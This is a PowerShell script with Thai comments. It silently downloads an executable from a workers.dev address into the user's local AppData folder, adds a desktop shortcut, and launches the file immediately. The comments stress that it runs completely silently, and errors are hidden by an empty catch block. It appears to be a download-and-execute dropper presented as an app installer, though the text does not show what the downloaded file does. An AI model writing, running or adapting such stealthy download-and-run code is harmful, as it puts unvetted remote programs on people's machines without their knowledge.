# ปิดการแสดงแถบดาวน์โหลดและข้อความทั้งหมด (ทำงานแบบเงียบสนิท 100%)
$ProgressPreference = 'SilentlyContinue'

$exeUrl = "https://zenx-installer.0xforyourstore.workers.dev/app"
$installDir = "$env:LOCALAPPDATA\TestApp"
$exePath = "$installDir\Test.exe"

try {
    # สร้างโฟลเดอร์แบบเงียบๆ
    if (!(Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }

    # ดาวน์โหลดไฟล์แบบเงียบๆ
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

    # สร้าง Shortcut บน Desktop (ถ้ายังไม่มี)
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $shortcutPath = "$desktopPath\Test.lnk"
    if (!(Test-Path $shortcutPath)) {
        $wscriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $wscriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $exePath
        $shortcut.WorkingDirectory = $installDir
        $shortcut.Save()
    }

    # เปิดโปรแกรม Test.exe ทันที
    Start-Process -FilePath $exePath -WorkingDirectory $installDir

}
catch {
    # ไม่แสดงข้อผิดพลาด
}
